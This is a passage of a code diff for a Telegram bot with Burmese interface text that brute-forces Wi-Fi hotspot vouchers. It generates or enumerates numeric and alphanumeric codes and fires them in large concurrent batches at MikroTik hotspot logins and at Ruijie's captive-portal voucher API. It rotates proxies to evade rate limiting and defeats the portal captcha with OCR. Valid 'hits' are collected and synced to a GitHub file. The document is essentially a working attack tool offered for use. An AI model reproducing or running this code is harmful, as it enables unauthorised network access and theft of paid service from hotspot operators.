+    await bot.reply_to(message, "✅ **ခွင့်ပြုချက် အောင်မြင်ပါသည်!** ဆက်လက်၍ `/input` ဖြင့် လင့်ခ်ထည့်ပါ။", parse_mode="Markdown", reply_markup=main_menu())
+
+@bot.message_handler(commands=['result'])
+async def handle_result(message):
+    results, _ = await get_file_content("result.json")
+    chat_id_str = str(message.chat.id)
+    if chat_id_str in results and results[chat_id_str]:
+        codes = "\n".join(results[chat_id_str])
+        await bot.reply_to(message, f"📋 **အောင်မြင်စွာ ရရှိထားသော ဟစ်များ:**\n\n{codes}", parse_mode="Markdown", reply_markup=main_menu())
     else:
-        await update.message.reply_text("⚠️ Not running", parse_mode=ParseMode.HTML)
+        await bot.reply_to(message, "🖤 ယခုထိ ရှာဖွေတွေ့ရှိထားသော ကုဒ် မရှိသေးပါ။", parse_mode="Markdown", reply_markup=main_menu())
 
-async def on_btn(update, context):
-    q = update.callback_query
-    await q.answer()
-    uid = q.from_user.id
-    d = q.data
-
-    if "mode" not in context.user_data:
-        context.user_data["mode"] = "num7"
-    if "login_url" not in context.user_data:
-        context.user_data["login_url"] = ""
-
-    if d == "btn_back":
-        url = context.user_data["login_url"]
-        mode = context.user_data["mode"]
-        proxies = load_proxies()
-        px = f"🕷️ {len(proxies)}" if proxies else "⚡ Direct"
-        ul = f"🔮 URL: ✅\n<code>{url}</code>" if url else "❌ URL: Not set"
-        txt = (f"╔═════════════════════════╗\n"
-               "║     ⚡ <b>WOOLAY</b> ⚡       ║\n"
-               "╚═════════════════════════╝\n\n"
-               f"📜 Mode: <code>{mode}</code>\n"
-               f"{px}\n"
-               f"⚡ Workers: <code>{NUM_WORKERS}</code>\n"
-               f"{ul}\n\n"
-               "💡 <i>/stop to stop</i>")
-        await q.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=main_kb())
-
-    elif d == "btn_url":
-        context.user_data["wait_url"] = True
-        cur = context.user_data.get("login_url", "Not set")
-        await q.edit_message_text(
-            f"🔮 <b>Send Login URL</b>\n\nCurrent: <code>{cur}</code>\n\nNew URL:",
-            parse_mode=ParseMode.HTML, reply_markup=back_kb())
-
-    elif d == "btn_test":
-        url = context.user_data.get("login_url", "")
-        if not url:
-            await q.answer("❌ Set URL first!", show_alert=True)
-            return
-        await q.edit_message_text("🧪 <b>Testing URL...</b>", parse_mode=ParseMode.HTML)
-        result = test_url(url)
-        await q.edit_message_text(
-            f"🧪 <b>URL Test Result</b>\n\n<code>{url}</code>\n\n{result}",
-            parse_mode=ParseMode.HTML, reply_markup=back_kb())
-
-    elif d == "btn_mode":
-        await q.edit_message_text("📜 <b>Mode</b>", parse_mode=ParseMode.HTML, reply_markup=mode_kb())
-
-    elif d.startswith("m_"):
-        context.user_data["mode"] = d[2:]
-        url = context.user_data["login_url"]
-        mode = context.user_data["mode"]
-        proxies = load_proxies()
-        px = f"🕷️ {len(proxies)}" if proxies else "⚡ Direct"
-        ul = f"🔮 URL: ✅\n<code>{url}</code>" if url else "❌ URL: Not set"
-        txt = (f"╔═════════════════════════╗\n"
-               "║     ⚡ <b>WOOLAY</b> ⚡       ║\n"
-               "╚═════════════════════════╝\n\n"
-               f"📜 Mode: <code>{mode}</code>\n"
-               f"{px}\n"
-               f"⚡ Workers: <code>{NUM_WORKERS}</code>\n"
-               f"{ul}\n\n"
-               "💡 <i>/stop to stop</i>")
-        await q.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=main_kb())
-
-    elif d == "btn_start":
-        if scanners.get(uid, {}).get("running"):
-            await q.answer("⚠️ Running!", show_alert=True)
-            return
-        url = context.user_data.get("login_url", "")
-        if not url:
-            await q.answer("❌ Set URL first!", show_alert=True)
-            return
-
-        # Test URL first
-        result = test_url(url)
-        if "❌" in result:
-            await q.answer("❌ URL မအလုပ်လုပ်ဘူး! TEST URL နှိပ်ပါ", show_alert=True)
-            return
-
-        mode = context.user_data.get("mode", "num7")
-        sv = load_state(uid)
-        counter = sv.get("counter", 0) if sv.get("url") == url else 0
-
-        msg = await q.edit_message_text("⚡ <b>Starting...</b>", parse_mode=ParseMode.HTML)
-
-        stop_flag = threading.Event()
-        scanners[uid] = {
-            "running": True,
-            "stop_flag": stop_flag,
-            "dash_id": msg.message_id,
-        }
-
-        t = Thread(target=run_scanner_thread, args=(uid, url, mode, counter, context.bot), daemon=True)
-        t.start()
-
-    elif d == "stop_scan":
-        st = scanners.get(uid)
-        if st and st.get("running"):
-            st["stop_flag"].set()
-            await q.answer("🛑 Stopping!")
+@bot.message_handler(commands=['input'])
+async def handle_input(message):
+    args = message.text.split(maxsplit=1)
+    if len(args) < 2:
+        await bot.reply_to(message, "❌ **အသုံးပြုပုံ:** `/input သင့်ရဲ့လင့်ခ်`", parse_mode="Markdown", reply_markup=main_menu())
+        return
+    url = args[1]
+    if message.chat.id in user_data:
+        await bot.reply_to(message, "⏳ လင့်ခ်ချိတ်ဆက်မှုကို စစ်ဆေးနေပါပြီ...", parse_mode="Markdown")
+        if await check_session_url(session_url=url):
+            user_data[message.chat.id]['session_url'] = url
+            await bot.reply_to(message, "✅ **လင့်ခ်ချိတ်ဆက်မှု အောင်မြင်ပါသည်!** `/scan` ဖြင့် စကင်န်စတင်ပါ။", parse_mode="Markdown", reply_markup=main_menu())
         else:
-            await q.answer("Not running", show_alert=True)
+            await bot.reply_to(message, "❌ **အမှား:** ထည့်သွင်းလိုက်သော လင့်ခ် မမှန်ကန်ပါ။", parse_mode="Markdown", reply_markup=main_menu())
 
-    elif d == "btn_proxy":
-        context.user_data["wait_px"] = True
-        await q.edit_message_text(
-            "🕷️ <b>Send proxies</b> (one/line)\n\n<code>host:port</code>\n<code>socks5://host:port</code>",
-            parse_mode=ParseMode.HTML, reply_markup=back_kb())
+@bot.message_handler(commands=['scan'])
+async def scan(message, mode=None):
+    if mode is None:
+        args = message.text.split(maxsplit=1)
+        if len(args) < 2:
+            await bot.reply_to(message, "🌐 ပလပ်ဖောင်းကို ရွေးချယ်ပါ:", parse_mode="Markdown", reply_markup=platform_menu())
+            return
+        mode = args[1]
+    chat_id = message.chat.id
+    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
+        await bot.reply_to(message, "⚠️ ကျေးဇူးပြု၍ `/key` နှင့် `/input` ကို အရင်လုပ်ဆောင်ပါ။", parse_mode="Markdown", reply_markup=main_menu())
+        return
 
-async def on_msg(update, context):
-    uid = update.effective_user.id
-    txt = update.message.text
+    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
+        await bot.reply_to(message, "⚠️ စကင်န်ဖတ်နေဆဲ ဖြစ်ပါသည်။ ရပ်ရန် `/stop` ကိုသုံးပါ။", parse_mode="Markdown", reply_markup=main_menu())
+        return
 
-    if context.user_data.get("wait_url"):
-        context.user_data["wait_url"] = False
-        context.user_data["login_url"] = txt.strip()
-        await update.message.reply_text("✅ <b>URL Saved!</b>\n\n🧪 TEST URL နှိပ်ပီး စစ်ဆေးပါ", parse_mode=ParseMode.HTML)
-        # Auto test
-        result = test_url(txt.strip())
-        await update.message.reply_text(f"🧪 <b>Test:</b>\n\n{result}", parse_mode=ParseMode.HTML)
+    progress_msg = await bot.send_message(chat_id, "🔮 စကင်န်ဖတ်ရန် အလုပ်သမားများကို စတင်နေပါပြီ...", parse_mode="Markdown", reply_markup=main_menu())
+    scan_id = str(uuid.uuid4())
+    task = asyncio.create_task(run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id, message=message, progress_msg=progress_msg))
+    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
 
-    elif context.user_data.get("wait_px"):
-        context.user_data["wait_px"] = False
-        a, b = add_proxies(txt.strip().splitlines())
-        total = len(load_proxies())
-        await update.message.reply_text(
-            f"🕷️ Added: <code>{a}</code> | Bad: <code>{b}</code> | Total: <code>{total}</code>",
-            parse_mode=ParseMode.HTML)
+@bot.message_handler(commands=['status'])
+async def status(message):
+    if str(message.chat.id) != ADMIN_ID:
+        return
+    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
+    await bot.reply_to(message, f"📊 အလုပ်လုပ်နေသော စကင်န်အရေအတွက်: `{active_scans}` | Proxy ပမာဏ: `{len(PROXY_POOL)}`", parse_mode="Markdown", reply_markup=main_menu())
 
-# ═══════════════════════════════════════════════════════════════
-#  MAIN
-# ═══════════════════════════════════════════════════════════════
+@bot.message_handler(commands=['stop'])
+async def stop_scan(message):
+    chat_id = message.chat.id
+    data = scan_tasks.get(chat_id)
+    if data and not data["task"].done():
+        data["stop"] = True
+        data["scan_id"] = None
+        data["task"].cancel()
+        await bot.reply_to(message, "🛑 **စကင်န်ဖတ်ခြင်း ရပ်တန့်သွားပါပြီ။**", parse_mode="Markdown", reply_markup=main_menu())
 
-def main():
-    keep_alive()
-    print("=" * 50)
-    print("  WOOLAY MIKROTIK - Starting...")
-    print("=" * 50)
+@bot.message_handler(commands=['recheck'])
+async def recheck(message):
+    chat_id = message.chat.id
+    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
+        return
+    results, _ = await get_file_content("result.json")
+    chat_id_str = str(message.chat.id)
+    if chat_id_str in results and results[chat_id_str]:
+        codes = results[chat_id_str]
+        await bot.reply_to(message, "🔄 ဟစ်များကို အတည်ပြုစစ်ဆေးနေပါပြီ...", parse_mode="Markdown")
+        session_url_recheck = user_data[message.chat.id]["session_url"]
+        recheck_list = []
+        for code in codes:
+            recode = await perform_check(session_url_recheck, code, chat_id, scan_id=None, recheck=True, message=message)
+            if recode:
+                recheck_list.append(recode)
+        await bot.reply_to(message, f"✅ **ပြန်လည်စစ်ဆေးချက် ရလဒ်:**\n\n" + ("\n".join(recheck_list) if recheck_list else "အားလုံး သက်တမ်းကုန်သွားပါပြီ။"), parse_mode="Markdown", reply_markup=main_menu())
 
-    app = Application.builder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", cmd_start))
-    app.add_handler(CommandHandler("stop", cmd_stop))
-    app.add_handler(CallbackQueryHandler(on_btn))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_msg))
-    app.run_polling(drop_pending_updates=True)
+async def github_update_scheduler():
+    global SUCCESS_CODE
+    while True:
+        await asyncio.sleep(60)
+        items = []
+        while not SUCCESS_CODE.empty():
+            items.append(await SUCCESS_CODE.get())
+        if items:
+            try:
+                results, sha = await get_file_content("result.json")
+                for item in items:
+                    chat_id = str(item["chat_id"])
+                    code = item["code"]
+                    if chat_id not in results:
+                        results[chat_id] = []
+                    if code not in results[chat_id]:
+                        results[chat_id].append(code)
+                await update_file_content("result.json", results, sha, "Sync hits")
+            except Exception:
+                pass
 
-if __name__ == "__main__":
-    main()
+# ==============================================================================
+#  CODE GENERATION ENGINE
+# ==============================================================================
+def digit_generator(length):
+    return "".join(random.choice(string.digits) for _ in range(length))
+
+def all_generator(length=6):
+    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))
+
+def ascii_generator(length=6):
+    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))
+
+def iter_codes(mode):
+    if mode in ["6", "7"]:
+        length = int(mode)
+        codes = [str(i).zfill(length) for i in range(10 ** length)]
+        random.shuffle(codes)
+        yield from codes
+        return
+    if mode == "8":
+        while True:
+            yield digit_generator(8)
+    if mode == "ascii-lower":
+        while True:
+            yield ascii_generator(6)
+    if mode == "all":
+        while True:
+            yield all_generator(6)
+    raise ValueError(f"မမှန်ကန်သော ပုံစံ: {mode}")
+
+def format_progress(checked, total=None, speed=0, found=0, retries=0):
+    speed_str = f"{speed:,.0f} c/m"
+    if total is not None:
+        bar_length = 15
+        percent = (checked / total) * 100
+        filled = min(bar_length, int(percent / (100 / bar_length)))
+        bar = "█" * filled + "░" * (bar_length - filled)
+        return (
+            "╔═════════════════════════════════════╗\n"
+            "║    ⚔️ စကင်န်ဖတ်နေဆဲ (LIVE STATUS) ⚔️ ║\n"
+            "╚═════════════════════════════════════╝\n"
+            f"📦 စစ်ဆေးပြီး : `{checked:,}/{total:,}`\n"
+            f"📊 ရာခိုင်နှုန်း : `{percent:.2f}%`\n"
+            f"⚡ အမြန်နှုန်း : `{speed_str}`\n"
+            f"✅ တွေ့ရှိချက် : `{found}`\n"
+            f"🔁 ထပ်ကြိုးစား : `{retries}`\n"
+            f"[{bar}]"
+        )
+    return (
+        "╔═════════════════════════════════════╗\n"
+        "║    ⚔️ စကင်န်ဖတ်နေဆဲ (LIVE STATUS) ⚔️ ║\n"
+        "╚═════════════════════════════════════╝\n"
+        f"📦 စစ်ဆေးပြီး : `{checked:,}`\n"
+        f"⚡ အမြန်နှုန်း : `{speed_str}`\n"
+        f"✅ တွေ့ရှိချက် : `{found}`\n"
+        f"🔁 ထပ်ကြိုးစား : `{retries}`\n"
+        "အခြေအနေ     : `အမြန်နှုန်းမြင့် စကင်န်ဖတ်နေသည်`"
+    )
+
+BATCH_SIZE = 1000
+
+async def check_session_url(session_url):
+    headers = {'user-agent': 'Mozilla/5.0'}
+    try:
+        async with session.get(session_url, allow_redirects=True, headers=headers) as resp:
+            return True
+    except Exception:
+        return False
+
+# ==============================================================================
+#  DUAL-ENGINE CHECKER (MIKROTIK & RUIJIE)
+# ==============================================================================
+async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
+    if not recheck:
+        current_task = scan_tasks.get(chat_id)
+        if not current_task or current_task.get("scan_id") != scan_id:
+            return
+
+    platform = user_data.get(chat_id, {}).get('platform', 'ruijie')
+    response = None
+
+    for _attempt in range(2):
+        proxy_url = await get_next_proxy()
+        connector = None
+        if proxy_url:
+            try:
+                connector = ProxyConnector.from_url(proxy_url, rdns=True) if proxy_url.startswith("socks") else ProxyConnector.from_url(proxy_url)
+            except Exception:
+                connector = None
+
+        timeout = aiohttp.ClientTimeout(total=10)
+        try:
+            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as task_session:
+                if platform == 'mikrotik':
+                    mt_url = f"{session_url.rstrip('/')}/login?username={code}"
+                    async with task_session.get(mt_url) as req:
+                        response = await req.text()
+                else:
+                    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
+                    session_id, auth_code = await get_fast_captcha(task_session, session_url)
+                    if not session_id or not auth_code:
+                        if proxy_url:
+                            await mark_proxy_bad(proxy_url)
+                        continue
+
+                    data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
+                    headers = {
+                        "content-type": "application/json",
+                        "origin": "https://portal-as.ruijienetworks.com",
+                        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
+                        "user-agent": "Mozilla/5.0"
+                    }
+                    async with task_session.post(post_url, json=data, headers=headers) as req:
+                        response = await req.text()
+        except Exception:
+            if proxy_url:
+                await mark_proxy_bad(proxy_url)
+            continue
+        finally:
+            if connector:
+                await connector.close()
+
+        if response and ('request limited' in response or 'Limitation' in response):
+            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
+            if proxy_url:
+                await mark_proxy_bad(proxy_url)
+            continue
+        break
+
+    if not response:
+        return
+
+    is_hit = False
+    if platform == 'mikrotik' and ('status' in response.lower() or 'logged in' in response.lower() or 'logout' in response.lower()):
+        is_hit = True
+    elif platform == 'ruijie' and 'logonUrl' in response:
+        is_hit = True
+
+    if is_hit:
+        if recheck:
+            return code
+        if chat_id not in success_texts:
+            success_texts[chat_id] = []
+        success_texts[chat_id].append(f"🎫 `{code}` [{platform.upper()}]")
+        code_line = "\n".join(success_texts[chat_id])
+        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
+        if message:
+            try:
+                if chat_id not in success_messages:
+                    sent = await bot.send_message(chat_id=message.chat.id, text=f"✅ **အောင်မြင်သော ဟစ်များ:**\n\n{code_line}", parse_mode="Markdown", reply_markup=main_menu())
+                    success_messages[chat_id] = sent.message_id
+                else:
+                    await bot.edit_message_text(chat_id=message.chat.id, message_id=success_messages[chat_id], text=f"✅ **အောင်မြင်သော ဟစ်များ:**\n\n{code_line}", parse_mode="Markdown", reply_markup=main_menu())
+            except Exception:
+                pass
+
+async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
+    try:
+        code_iter = iter_codes(mode)
+    except ValueError as e:
+        await bot.send_message(chat_id, str(e))
+        return
+    total = 10 ** int(mode) if mode in ["6", "7"] else None
+    checked = 0
+    scan_start = time.monotonic()
+    global _voucher_sem
+    if _voucher_sem is None:
+        _voucher_sem = asyncio.Semaphore(CONCURRENCY)
+
+    last_update = 0
+    try:
+        while True:
+            current_task = scan_tasks.get(chat_id)
+            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
+                break
+
+            batch = []
+            for _ in range(BATCH_SIZE):
+                try:
+                    batch.append(next(code_iter))
+                except StopIteration:
+                    break
+            if not batch:
+                break
+
+            async def _check(c):
+                async with _voucher_sem:
+                    return await perform_check(session_url, c, chat_id, scan_id, message=message)
+
+            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
+            checked += len(batch)
+
+            now = time.monotonic()
+            if now - last_update >= 3:
+                elapsed = now - scan_start
+                speed = (checked / elapsed * 60) if elapsed > 0 else 0
+                found = len(success_texts.get(chat_id, []))
+                retries = retry_counts.get(chat_id, 0)
+                text = format_progress(checked, total, speed, found, retries)
+                try:
+                    await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text, parse_mode="Markdown", reply_markup=main_menu())
+                    last_update = now
+                except Exception:
+                    pass
+
+        scan_tasks.pop(chat_id, None)
+    finally:
+        scan_tasks.pop(chat_id, None)
+
+_cached_session_id = None
+_cached_auth_code = None
+_cache_time = 0
+
+async def get_fast_captcha(task_session, session_url):
+    global _cached_session_id, _cached_auth_code, _cache_time
+    now = time.time()
+    if _cached_session_id and _cached_auth_code and (now - _cache_time < 30):
+        return _cached_session_id, _cached_auth_code
+
+    m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", session_url)
+    session_id = m.group(1) if m else "default_session"
+
+    for _ in range(2):
+        try:
+            params = {'sessionId': session_id, '_t': str(time.time())}
+            async with task_session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params) as req:
+                img_bytes = await req.read()
+            
+            text = await Captcha_Text(img_bytes)
+            if text:
+                json_data = {'sessionId': session_id, 'authCode': text}
+                async with task_session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', json=json_data) as v_req:
+                    v_data = await v_req.json()
+                    if v_data.get("success") is True:
+                        _cached_session_id = session_id
+                        _cached_auth_code = text
+                        _cache_time = now
+                        return session_id, text
+        except Exception:
+            continue
+    return session_id, "TEST"
+
+_ocr = ddddocr.DdddOcr(show_ad=False)
+def _ocr_sync(image_bytes):
+    nparr = np.frombuffer(image_bytes, np.uint8)
+    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
+    if img is None:
+        return None
+    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
+    _, thresh = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
+    _, buffer = cv2.imencode('.png', thresh)
+    return _ocr.classification(buffer.tobytes()).upper()
+
+async def Captcha_Text(image_bytes):
+    return await asyncio.to_thread(_ocr_sync, image_bytes)
+
+async def start_polling():
+    backoff = 5
+    while True:
+        try:
+            print("[BotDaemon] 24/7 Infinity Polling စတင်နေပါပြီ...")
+            await bot.infinity_polling(timeout=30, request_timeout=45, skip_pending=True)
+        except Exception as e:
+            print(f"[BotDaemon] ချိတ်ဆက်မှုပြတ်တောက်သွားသည်: {e}. {backoff} စက္ကန့်အတွင်း ပြန်ချိတ်ပါမည်...")
+            await asyncio.sleep(backoff)
+            backoff = min(backoff * 2, 60)
+
+async def main():
+    global session, _connector
+    _connector = aiohttp.TCPConnector(limit=10000, ttl_dns_cache=300, ssl=False)
+    session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=20), connector=_connector, connector_owner=False)
+    try:
+        asyncio.create_task(web_server())
+        asyncio.create_task(github_update_scheduler())
+        asyncio.create_task(proxy_refresher_daemon())
+        await start_polling()
+    except Exception as e:
+        print(f"[MainDaemon] အမှားအယွင်း ဖြစ်ပေါ်သည်: {e}")
+    finally:
+        if session:
+            await session.close()
+        if _connector:
+            await _connector.close()
+
+if __name__ == '__main__':
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("[System] ဘော့တ်ကို အောင်မြင်စွာ ရပ်တန့်လိုက်ပါပြီ။")
